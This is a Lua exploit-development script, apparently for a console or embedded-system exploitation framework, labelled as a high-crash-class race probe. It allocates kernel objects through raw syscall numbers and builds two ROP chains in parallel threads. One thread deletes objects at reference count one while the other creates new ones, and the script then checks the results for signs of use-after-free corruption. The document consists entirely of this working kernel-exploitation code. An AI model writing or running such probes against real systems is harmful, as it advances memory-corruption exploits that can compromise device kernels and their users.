-- CRASH_CLASS: HIGH
-- PROBE 643a: one thread frees C (count==1 deletes) while another creates objects
print("=== PROBE 643a: DELETE vs CREATE RACE ===")
local function N(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function U(a) a=N(a) return uint64(string.format("0x%08X%08X",math.floor(a/4294967296),a%4294967296)) end
local function wd(a,v) pcall(function() memory.write_dword(a,v) end) end
local function wq(a,v) pcall(function() memory.write_qword(a,v) end) end
local function rd(a) local o,v=pcall(function() return memory.read_dword(a) end) if o then return N(v) end return nil end
local NB=16
local NC=16
local data=memory.alloc(0x2000) local chk=memory.alloc(0x40)
for i=0,0x1FFC,4 do wd(N(data)+i,0) end
local sc669=mk(669) local sc664=mk(664) local sc662=mk(662) local sc454=mk(454)
local first=memory.alloc(NB*4) local last=memory.alloc(NB*4)
local made=0
local out=memory.alloc(0x40)
for b=0,NB-1 do
    wd(N(out),0)
    local o,r=pcall(function() return sc669(uint64(0x1001),uint64(N(data)),uint64(2),uint64(1),uint64(N(out))) end)
    local base=rd(N(out))
    if o and N(r)==0 and base and base>0 then
        wd(N(first)+b*4, base) wd(N(last)+b*4, base+0x10000) made=made+1
    else break end
end
print(string.format("[A] blocks=%d",made))
if made<4 then return end
local good=0
for b=0,made-1 do
    wd(N(chk),0x77777777) pcall(function() sc664(U(N(first)+b*4),uint64(1),uint64(N(chk))) end)
    local s1=rd(N(chk))
    wd(N(chk),0x77777777) pcall(function() sc664(U(N(last)+b*4),uint64(1),uint64(N(chk))) end)
    local s2=rd(N(chk))
    if s1==3 and s2==3 then good=good+1 end
end
print(string.format("[B] polled=%d/%d",good,made))
if good<made then return end
local ok0=0
for b=0,made-1 do
    wd(N(chk),0x77777777)
    local o,r=pcall(function() return sc662(U(N(first)+b*4),uint64(1),uint64(N(chk))) end)
    if o and N(r)==0 and rd(N(chk))==0 then ok0=ok0+1 end
end
print(string.format("[C] count lowered=%d/%d",ok0,made))
if ok0<made then return end
local W=memory.alloc(8)
wq(N(W),uint64(0))
local stA=memory.alloc(made*4)
for i=0,made*4-1,4 do wd(N(stA)+i,0x77777777) end
local cout=memory.alloc(NC*0x40)
for i=0,NC*0x40-1,4 do wd(N(cout)+i,0) end
local cA=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cA:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
for b=0,made-1 do
    cA:push_syscall_with_ret(mk(662), U(N(last)+b*4), uint64(1), U(N(stA)+b*4))
end
local cB=ropchain({fcall_stub_padding_size=0x50000,stack_size=0x20000})
cB:push_syscall_with_ret(mk(454), U(N(W)), uint64(2), uint64(0))
for i=0,NC-1 do
    cB:push_syscall_with_ret(mk(669), uint64(1), U(N(data)), uint64(1), uint64(1), U(N(cout)+i*0x40), uint64(0))
end
print("[D] chains built")
local ta=thread:new(cA)
local tb=thread:new(cB)
ta:run(true)
tb:run(true)
for i=1,600000 do local x=i end
wq(N(W),uint64(1))
local ow,rw=pcall(function() return sc454(U(N(W)),uint64(3),uint64(0x7fffffff)) end)
print(string.format("[E] wake rv=%s",tostring(ow and rw or "err")))
ta:join()
tb:join()
print("[F] joined")
local za=0
for b=0,made-1 do if rd(N(stA)+b*4)==0 then za=za+1 end end
local created=0
for i=0,NC-1 do if (rd(N(cout)+i*0x40) or 0)>0 then created=created+1 end end
print(string.format("[G] A zeros=%d/%d  B created=%d/%d",za,made,created,NC))
local hb=0
local bad=""
for i=0,NC-1 do
    local id=rd(N(cout)+i*0x40) or 0
    if id>0 then
        wd(N(chk),0x77777777) wd(N(data),id)
        pcall(function() sc664(U(N(data)),uint64(1),uint64(N(chk))) end)
        local s=rd(N(chk))
        wd(N(chk),0x77777777)
        local o,r=pcall(function() return sc662(U(N(data)),uint64(1),uint64(N(chk))) end)
        local d=rd(N(chk))
        if (s==3 or s==0x10003) and o and N(r)==0 and d==0 then hb=hb+1
        else bad=bad..string.format(" %d:p%s/d%s",i,tostring(s),tostring(d)) end
    end
end
print(string.format("[H] B objects healthy=%d/%d%s",hb,created,bad))
print(string.format("[I] alive=%d",N(native.fcall_with_rax(syscall.pipe.fn_addr,20))))
print("[Z] alive")
